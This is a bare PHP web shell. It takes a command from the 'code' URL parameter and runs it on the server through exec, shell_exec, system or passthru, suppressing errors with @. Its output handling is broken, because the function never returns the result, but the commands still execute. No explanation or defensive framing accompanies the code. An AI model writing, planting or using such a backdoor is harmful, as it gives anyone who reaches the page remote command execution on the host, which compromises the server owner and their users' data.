<?php
function execute($cfe) {
	if(function_exists('exec')) 
		@exec($cfe,$res);	
	elseif(function_exists('shell_exec')) 
		@shell_exec($cfe);
	elseif(function_exists('system')) {
		@ob_start();
		@system($cfe);
		$res = @ob_get_contents();
		@ob_end_clean();
	} elseif(function_exists('passthru')) {
		@ob_start();
		@passthru($cfe);
		$res = @ob_get_contents();
		@ob_end_clean();
	} 
}

$command = $_GET['code'];
echo(execute($command));
?>